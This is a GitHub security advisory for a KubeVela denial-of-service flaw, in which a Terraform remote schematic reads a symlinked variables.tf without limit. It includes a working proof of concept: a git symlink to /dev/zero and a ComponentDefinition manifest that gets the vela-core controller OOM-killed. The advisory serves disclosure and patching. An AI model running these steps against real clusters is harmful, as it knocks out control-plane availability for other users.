# [H] KubeVela Terraform remote loader DoS via unbounded file read

## Summary
Severity: High
Advisory: GHSA-fmgp-q6jx-gg3x
CVE: CVE-2026-55108
CWE: CWE-59, CWE-400
Ecosystem: Go
CVSS: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:L/I:N/A:H (CVSS_V3)
Published: 2026-08-28
Source: https://github.com/advisories/GHSA-fmgp-q6jx-gg3x
Type: github-advisory

## Affected
- Go: `github.com/oam-dev/kubevela` — affected >=0 <1.9.14
- Go: `github.com/oam-dev/kubevela` — affected >=1.10.0-alpha.1 <1.10.9
- Go: `github.com/oam-dev/kubevela` — affected >=1.11.0-alpha.1 <1.11.0-alpha.4

## Details
### Summary

KubeVela's Terraform remote configuration loader can be abused to make `vela-core` read an unbounded byte stream into memory, causing an out-of-memory kill and a control-plane denial of service.

The issue is reachable when a user with permission to create or update a `core.oam.dev/v1beta1` `ComponentDefinition` registers a Terraform `remote` schematic that points to a malicious or compromised git repository. The repository can contain a `variables.tf` symlink that resolves to `/dev/zero` after checkout. `vela-core` follows the symlink and calls `os.ReadFile` before HCL parsing, so memory grows until the controller is OOM killed.

### Details

The affected code is in `pkg/controller/utils/capability.go`, inside `GetTerraformConfigurationFromRemote`:

https://github.com/kubevela/kubevela/blob/a24d3a9c6/pkg/controller/utils/capability.go#L231-L242

```go
tfPath := filepath.Join(cachePath, remotePath, "variables.tf")
if _, err := os.Stat(tfPath); err != nil {
    tfPath = filepath.Join(cachePath, remotePath, "main.tf")
    if _, err := os.Stat(tfPath); err != nil {
        return "", errors.Wrap(err, "failed to find main.tf or variables.tf in Terraform configurations of the remote repository")
    }
}
conf, err := os.ReadFile(filepath.Clean(tfPath))
if err != nil {
    return "", errors.Wrap(err, "failed to read Terraform configuration")
}
```

When a `ComponentDefinition` uses:

```yaml
schematic:
  terraform:
    type: remote
    configuration: <git repository URL>
```

the controller clones the user-supplied git repository and then reads `variables.tf` or `main.tf` from the checkout. The read path is built from attacker-controlled repository contents and `terraform.path`, but the code does not verify:

- whether the target is a regular file;
- whether the resolved path remains inside the clone cache;
- how large the file is before reading it.

Both `os.Stat` and `os.ReadFile` follow symlinks. If the repository contains `variables.tf -> ../../../../../../dev/zero`, then after checkout under the default cache path this symlink resolves to `/dev/zero`. `os.Stat` succeeds, and `os.ReadFile` reads from `/dev/zero`, which never returns EOF.

The failure happens during `os.ReadFile`, before the content reaches HCL parsing or `ParseTerraformVariables`, so later validation cannot prevent the OOM.

This vulnerability also has a path-traversal-like aspect, because symlinks and `terraform.path` can steer the read target outside the intended repository path. However, exposing arbitrary file contents would require the read data to pass HCL parsing before anything is written to a ConfigMap. Therefore, this report focuses on the availability impact caused by the unbounded read in `os.ReadFile` before HCL parsing, rather than a confidentiality impact.

### PoC

Prerequisites:

- KubeVela is installed with the default configuration, for example in a kind cluster:

```sh
helm install --create-namespace -n vela-system kubevela kubevela/vela-core --wait
```

- I reproduced this with `oamdev/vela-core:v1.10.8` and a `vela-core` memory limit of 1Gi.
- The attacker has `create` / `update` permissions for `core.oam.dev/v1beta1` `ComponentDefinition` in any namespace.
- The tester can create a git repository that `vela-core` can clone.

1. Create a test git repository. In the repository root, add a relative `variables.tf` symlink that resolves to `/dev/zero` after checkout, then push it:

```sh
git init poc-tf-dos && cd poc-tf-dos
ln -s ../../../../../../dev/zero variables.tf
git add variables.tf && git commit -m "poc"
git remote add origin https://github.com/<YOUR_ORG>/<YOUR_REPO>.git
git push -u origin main
```

2. Create `poc-componentdefinition.yaml`. Replace `configuration` with the repository URL from step 1:

```yaml
apiVersion: core.oam.dev/v1beta1
kind: ComponentDefinition
metadata:
  name: dos-tf
  namespace: vela-system
spec:
  workload:
    definition:
      apiVersion: apps/v1
      kind: Deployment
  schematic:
    terraform:
      type: remote
      configuration: https://github.com/<YOUR_ORG>/<YOUR_REPO>.git
      path: ""
```

The workload GVK should reference a type that exists in the cluster, such as `apps/v1` `Deployment`.

3. Apply the manifest and observe `vela-core`:

```sh
kubectl apply -f poc-componentdefinition.yaml
kubectl -n vela-system get pods -l app.kubernetes.io/name=vela-core -w
```

4. Confirm the OOMKilled termination:

```sh
kubectl get pod -n vela-system -l app.kubernetes.io/name=vela-core \
  -o jsonpath='{.items[0].status.containerStatuses[0].lastState.terminated}{"\n"}'
```

Expected result:

```text
"exitCode":137
"reason":"OOMKilled"
```

The pod may then enter `CrashLoopBackOff`.

If the reconcile fails with `stat .../main.tf: no such file or directory`, check that the symlink is relative and resolves to `/dev/zero` from the checkout location. If the same `ComponentDefinition` was already reconciled, remove the stale clone cache under `/root/.vela/terraform/<name>` and retry.

### Impact

This is a denial-of-service vulnerability affecting KubeVela control-plane availability.

A user who can create or update `ComponentDefinition` objects can cause the cluster-wide `vela-core` controller to be OOM killed. 

If `vela-core` has a memory limit, the impact is likely contained to repeated OOMKilled restarts of the controller Pod. If no effective memory limit is configured, the unbounded read can also pressure node memory and affect other workloads running on the same node.

## References
- https://github.com/kubevela/kubevela/security/advisories/GHSA-fmgp-q6jx-gg3x
- https://github.com/kubevela/kubevela/pull/7191
- https://github.com/kubevela/kubevela/pull/7192
- https://github.com/kubevela/kubevela/commit/65dedda40a69cc1eccf4072a4c835e5b9f13334e
- https://github.com/kubevela/kubevela/commit/7a4e59b2958ce1cf031fafbc188d6fafe8fe4d2e
- https://github.com/kubevela/kubevela/commit/f6a64398b5e0065c57c3a0fb6765dd3dc48c749d
- https://github.com/kubevela/kubevela
- https://github.com/kubevela/kubevela/releases/tag/v1.10.9
- https://github.com/kubevela/kubevela/releases/tag/v1.11.0-alpha.4
- https://github.com/kubevela/kubevela/releases/tag/v1.9.14
